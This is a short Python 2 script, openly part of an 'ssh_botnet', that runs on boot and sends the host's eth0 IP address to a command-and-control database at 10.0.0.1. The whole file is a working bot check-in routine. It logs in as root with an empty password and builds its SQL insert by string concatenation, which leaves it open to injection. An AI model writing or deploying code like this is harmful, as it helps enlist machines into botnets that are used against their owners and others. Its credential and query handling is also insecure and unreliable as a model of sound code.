# report-ip.py

"""
Description:

This program reports the IP address of the computer to the database.
The script is run on boot, and the IP address reported is used by the SSH C&C server.

"""

import utils
import MySQLdb

# Connection strings
HOST        = "10.0.0.1"
USER        = "root"
PASSWORD    = ""
DB          = "ssh_botnet"

# Network interface
IFACE       = "eth0"

# Connect to database
db = MySQLdb.connect(host=HOST, user=USER, passwd=PASSWORD, db=DB)

# Create cursor object (this allows you to execute all the queries you need)
cur = db.cursor()

# Get IP address of eth0 interface
ip = utils.get_ip_address(IFACE)

# SQL insert
replace = "REPLACE INTO bot_ip (ip, status) VALUES('" + ip + "', 1);"
cur.execute(replace)

"""
# Check result before commiting
select = "SELECT * FROM bot_ip"
cur.execute(select)
for row in cur.fetchall():
    print row
"""

# Commit
db.commit()

